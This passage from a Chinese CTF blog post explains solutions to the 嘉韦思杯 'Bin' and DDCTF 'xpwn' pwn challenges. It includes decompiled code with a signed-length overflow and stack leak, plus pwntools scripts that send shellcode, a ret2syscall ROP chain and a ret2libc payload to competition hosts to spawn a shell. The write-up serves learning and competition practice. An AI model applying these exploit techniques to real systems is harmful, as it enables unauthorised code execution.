<p>然后就明白了，利用这个函数，就可以让程序返回到栈顶（esp）<br>构造脚本<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh=remote(<span class="string">'172.20.3.35'</span>,<span class="number">9999</span>)</span><br><span class="line"><span class="comment">#sh = process('./Bin')</span></span><br><span class="line">shellcode = asm(shellcraft.i386.linux.sh())</span><br><span class="line"><span class="comment">#buf2_addr = 0x0804853b</span></span><br><span class="line">hin_addr=<span class="number">0x080484ed</span></span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line">sh.sendline(<span class="string">"a"</span>*<span class="number">108</span>+shellcode[<span class="number">0</span>:<span class="number">4</span>] + p32(hin_addr)+shellcode[<span class="number">4</span>:])</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure></p>
<h2 id="DDCTF-pwn-xpwn"><a href="#DDCTF-pwn-xpwn" class="headerlink" title="DDCTF-pwn-xpwn"></a>DDCTF-pwn-xpwn</h2><p>保护就开了NX栈不可执行，那就用ret2syscall<br>这题唯一比较有意思的是ret前的汇编跟别的题目稍微有点不同<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.text:0804873A                 lea     esp, [ebp-8]</span><br><span class="line">.text:0804873D                 pop     ecx</span><br><span class="line">.text:0804873E                 pop     ebx</span><br><span class="line">.text:0804873F                 pop     ebp</span><br><span class="line">.text:08048740                 lea     esp, [ecx-4]</span><br><span class="line">.text:08048743                 retn</span><br></pre></td></tr></table></figure></p>
<p>这是main函数的结尾，可以看到先是esp=[ebp-8],接着pop ecx，然后esp=[ecx-4]，也相当于ret前栈顶的值变成了[[ebp-8]-4]的值，所以我们要在ebp-0x8的位置填上ropchain_addr+4，这样栈顶会变成ropchain_addr+4的地址，然后被pop给ecx，最后再esp=[ecx-4]=[ropchain_addr+4-4]=[ropchain_addr]，而地址ropchain_addr内就存放着exa_popret_addr的地址值，成功执行rop链。<br>解决了返回值的问题，还有一点就是如何泄露栈内的值<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+0h] [ebp-4Ch]</span></span><br><span class="line">  <span class="keyword">size_t</span> nbytes; <span class="comment">// [esp+40h] [ebp-Ch]</span></span><br><span class="line">  <span class="keyword">int</span> *v5; <span class="comment">// [esp+44h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = &amp;a1;</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">  sub_80485DB(<span class="built_in">stdin</span>, <span class="built_in">stdout</span>);<span class="comment">//存在read栈泄露</span></span><br><span class="line">  sleep(<span class="number">1u</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Please set the length of password: "</span>);</span><br><span class="line">  nbytes = sub_804862D();</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)nbytes &gt; <span class="number">63</span> )<span class="comment">//因为这里进行判断时nbyte是int型，而read读取时却是把它当作无符号的size_t，所以可以取负值造成栈溢出</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Too long!"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Enter password(lenth %u): "</span>, nbytes);</span><br><span class="line">  v1 = fileno(<span class="built_in">stdin</span>);</span><br><span class="line">  read(v1, &amp;buf, nbytes);<span class="comment">//存在栈溢出</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"All done, bye!"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>看题目，存在栈溢出，sub_80485DB内可以泄露栈内值<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">sub_80485DB</span><span class="params">(FILE *stream, FILE *a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+0h] [ebp-48h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Enter username: "</span>);</span><br><span class="line">  v2 = fileno(stream);</span><br><span class="line">  read(v2, &amp;buf, <span class="number">0x40</span>u);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">fprintf</span>(a2, <span class="string">"Hello %s"</span>, &amp;buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>这里的read不会在字符串末尾自动加上\x00，所以fprintf输出buf时会把栈内值都一起读出来，遇到\x00才终止，经过几次调试，会发现40个字符后会泄露ebp和setbuf+21的地址值，这样一来就获得了栈地址，也能通过setbuf+21的地址值计算出libc的基址了<br><img src="/images/2019-4-17/2019-4-17-2153.png" alt="avatar"></p>
<p>最后构造脚本<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str_to_hex</span><span class="params">(s)</span>:</span></span><br><span class="line">	<span class="keyword">return</span> <span class="string">' '</span>.join([hex(ord(c)).replace(<span class="string">'0x'</span>, <span class="string">''</span>) <span class="keyword">for</span> c <span class="keyword">in</span> s])</span><br><span class="line"><span class="comment">#remote</span></span><br><span class="line">offset=<span class="number">0x65465</span></span><br><span class="line">s=remote(<span class="string">"116.85.48.105"</span>,<span class="number">5005</span>)</span><br><span class="line">s.sendlineafter(<span class="string">"Enter username:"</span>,<span class="string">'a'</span>*<span class="number">39</span>)</span><br><span class="line"></span><br><span class="line">bin_offset=<span class="number">0x15902b</span></span><br><span class="line">eax_offset=<span class="number">0x00023f97</span></span><br><span class="line">ebx_edx_offset=<span class="number">0xf1cba</span></span><br><span class="line">ecx_offset=<span class="number">0xb4047</span></span><br><span class="line">int80_offset=<span class="number">0x00002c87</span></span><br><span class="line"></span><br><span class="line">a=s.recvuntil(<span class="string">"He"</span>)</span><br><span class="line">b=s.recv(<span class="number">64</span>)</span><br><span class="line"><span class="keyword">print</span> hex(u32(b[<span class="number">-12</span>:<span class="number">-8</span>]))</span><br><span class="line"><span class="keyword">print</span> hex(u32(b[<span class="number">-8</span>:<span class="number">-4</span>]))</span><br><span class="line"></span><br><span class="line">base_addr=u32(b[<span class="number">-8</span>:<span class="number">-4</span>])-offset</span><br><span class="line">ropchain_addr=u32(b[<span class="number">-12</span>:<span class="number">-8</span>])</span><br><span class="line">bin_addr=base_addr+bin_offset</span><br><span class="line">eax_addr=base_addr+eax_offset</span><br><span class="line">ebx_edx_addr=base_addr+ebx_edx_offset</span><br><span class="line">ecx_addr=base_addr+ecx_offset</span><br><span class="line">int80_addr=base_addr+int80_offset</span><br><span class="line"></span><br><span class="line">s.sendlineafter(<span class="string">"Please set the length of password:"</span>,<span class="string">"-10"</span>)</span><br><span class="line">s.sendlineafter(<span class="string">":"</span>,<span class="string">'a'</span>*<span class="number">68</span>+p32(ropchain_addr+<span class="number">4</span>)+<span class="string">'a'</span>*<span class="number">4</span>+p32(eax_addr)+p32(<span class="number">0xb</span>)+p32(ebx_edx_addr)+p32(bin_addr)+p32(<span class="number">0</span>)+p32(ecx_addr)+p32(<span class="number">0</span>)+p32(int80_addr))</span><br><span class="line">s.interactive()</span><br></pre></td></tr></table></figure></p>
<p>后来觉得rop链太长了，ret2libc也行<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str_to_hex</span><span class="params">(s)</span>:</span></span><br><span class="line">	<span class="keyword">return</span> <span class="string">' '</span>.join([hex(ord(c)).replace(<span class="string">'0x'</span>, <span class="string">''</span>) <span class="keyword">for</span> c <span class="keyword">in</span> s])</span><br><span class="line"></span><br><span class="line">offset=<span class="number">453205</span></span><br><span class="line">context(log_level = <span class="string">'debug'</span>, arch = <span class="string">'i386'</span>, os = <span class="string">'linux'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#local</span></span><br><span class="line">s=process(<span class="string">"./xpwn"</span>)</span><br><span class="line"><span class="comment">#gdb.attach(s)</span></span><br><span class="line">s.sendlineafter(<span class="string">"Enter username:"</span>,<span class="string">'a'</span>*<span class="number">39</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#local-rop</span></span><br><span class="line">system_offset=<span class="number">0x3d870</span></span><br><span class="line">bin_offset=<span class="number">0x0017c968</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">eax_offset=0x000255c7</span></span><br><span class="line"><span class="string">ebx_offset=0x00019705</span></span><br><span class="line"><span class="string">ecx_edx_offset=0x0002de3b</span></span><br><span class="line"><span class="string">int80_offset=0x0002e185</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">a=s.recvuntil(<span class="string">"He"</span>)</span><br><span class="line">b=s.recv(<span class="number">64</span>)</span><br><span class="line"><span class="keyword">print</span> hex(u32(b[<span class="number">-12</span>:<span class="number">-8</span>]))</span><br><span class="line"><span class="keyword">print</span> hex(u32(b[<span class="number">-8</span>:<span class="number">-4</span>]))</span><br><span class="line">base_addr=u32(b[<span class="number">-8</span>:<span class="number">-4</span>])-offset</span><br><span class="line">ropchain_addr=u32(b[<span class="number">-12</span>:<span class="number">-8</span>])</span><br><span class="line">bin_addr=base_addr+bin_offset</span><br><span class="line">system_addr=base_addr+system_offset</span><br><span class="line"></span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">68</span>+p32(ropchain_addr+<span class="number">4</span>)+<span class="string">'a'</span>*<span class="number">4</span>+p32(system_addr)+p32(<span class="number">0xb</span>)+p32(bin_addr)</span><br><span class="line"></span><br><span class="line">s.sendlineafter(<span class="string">"Please set the length of password:"</span>,<span class="string">"-1"</span>)</span><br><span class="line">s.sendlineafter(<span class="string">":"</span>,payload)</span><br><span class="line"></span><br><span class="line">s.interactive()</span><br></pre></td></tr></table></figure></p>
<p>感冒10天好了之后现在开始潜心修炼安卓和密码学</p>

  </article>
  <aside class="table-content" id="site-toc">
  <div class="table-content-title">
    <i class="fa fa-arrow-right fa-lg" id="site-toc-hide-btn"></i>
    <span>目录</span>
  </div>
  <div class="table-content-main">
    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#2019西湖论剑杯-re-easyCPP"><span class="toc-text">2019西湖论剑杯-re-easyCPP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2019西湖论剑杯-pwn-store"><span class="toc-text">2019西湖论剑杯-pwn-store</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2019嘉韦思杯final-pwn-Bin"><span class="toc-text">2019嘉韦思杯final-pwn-Bin</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DDCTF-pwn-xpwn"><span class="toc-text">DDCTF-pwn-xpwn</span></a></li></ol>
  </div>
</aside>
  
    <aside class="passage-copyright">
      <div>本文作者: starsdestinations</div>
      
        <div>
          原文链接: 
          <a href target="_blank">http://yoursite.com/passages/2019-4-17-近期比赛总结/</a>
        </div>
      
      <div>
        版权声明: 本博客所有文章除特别声明外, 均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议. 转载请注明出处!
      </div>
    </aside>
  
  
</div>

    </main>
    
      
<div class="site-comment-contanier" data-plateform="leancloud">
  
    <p id="site-comment-info">
      <i class="fa fa-spinner fa-spin"></i> 评论加载中
    </p>
    <div id="site-comment"></div>
  
</div>
    
    <div class="site-footer-wrapper">
  <footer class="site-footer">
    
      <div class="site-footer-col">
        <h5 class="site-footer-title">博客推荐</h5>
        
          <span class="site-footer-item">
            <a href="https://godbmw.com/" target="_blank">GodBMW</a>
          </span>
        
          <span class="site-footer-item">
            <a href="http://ruanyifeng.com/" target="_blank">阮一峰的个人网站</a>
          </span>
        
      </div>
    
      <div class="site-footer-col">
        <h5 class="site-footer-title">系列教程</h5>
        
          <span class="site-footer-item">
            <a href="https://godbmw.com/categories/webpack4%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B/" target="_blank">webpack4系列教程</a>
          </span>
        
          <span class="site-footer-item">
            <a href="https://godbmw.com/design-patterns/" target="_blank">设计模式手册</a>
          </span>
        
      </div>
    
      <div class="site-footer-col">
        <h5 class="site-footer-title">抓到我</h5>
        
          <span class="site-footer-item">
            <a href="https://github.com/starsdestinations/" target="_blank">github</a>
          </span>
        
      </div>
    
    <div class="site-footer-info">
      <i class="fa fa-clock-o"></i> 本站已稳定运行<span id="site-time"></span>
    </div>
    
      <div class="site-footer-info">
        <i class="fa fa-paw"></i> 您是本站第 <span id="site-count"></span> 位访客
      </div>
    
    
      <div class="site-footer-info">
        <i class="fa fa-at"></i> Email: 944641675@qq.com
      </div>
    
    <div class="site-footer-info">
      <i class="fa fa-copyright"></i> 
      2019 <a href="https://github.com/dongyuanxin/theme-ad/" target="_blank">Theme-AD</a>.
      Created by <a href="https://godbmw.com/" target="_blank">GodBMW</a>.
      All rights reserved.
    </div>
  </footer>
</div>
    <div id="site-layer" style="display:none;">
  <div class="site-layer-content">
    <div class="site-layer-header">
      <span class="site-layer-header-title" id="site-layer-title"></span>
      <i class="fa fa-close" id="site-layer-close"></i>
    </div>
    <div class="site-layer-body" id="site-layer-container">
      <div class="site-layer-input" id="site-layer-search" style="display: none;">
        <input type="text">
        <i class="fa fa-search"></i>
      </div>
      <div class="site-layer-reward" id="site-layer-reward" style="display: none;">
        
          <div>
            <img src="/images/wechat.png" alt="WeChat">
            
              <p>WeChat</p>
            
          </div>
        
      </div>
      <div id="site-layer-welcome" style="display:none;"></div>
    </div>
  </div>
</div>
    

<div class="bottom-bar">
  <div class="bottom-bar-left">
    <a href="/passages/2019-4-18-noinfoleak/" data-enable="true">
      <i class="fa fa-arrow-left"></i>
    </a>
    <a href="/passages/2019-4-6-pwnable.kr-unlink/" data-enable="true">
      <i class="fa fa-arrow-right"></i>
    </a>
  </div>
  <div class="bottom-bar-right">
    <a href="javascript:void(0);" data-enable="true" id="site-toc-show-btn">
      <i class="fa fa-bars"></i>
    </a>
    
      <a href="#site-comment" data-enable="true">
        <i class="fa fa-commenting"></i>
      </a>
    
    <a href="javascript:void(0);" id="site-toggle-share-btn">
      <i class="fa fa-share-alt"></i>
    </a>
    <a href="javascript:void(0);" id="site-reward">
      <i class="fa fa-thumbs-up"></i>
    </a>
    <a href="javascript:void(0);" id="back-top-btn">
      <i class="fa fa-chevron-up"></i>
    </a>
  </div>
</div>
    <div id="share-btn">
  
  
  
  
    <a id="share-btn-qq" href="javascript:void(0);" target="_blank">
      <i class="fa fa-qq"></i>
    </a>
  
  
    <a id="share-btn-wechat" href="javascript:void(0);" target="_blank">
      <i class="fa fa-wechat"></i>
    </a>
  
</div>
    





    
  </body>
</html>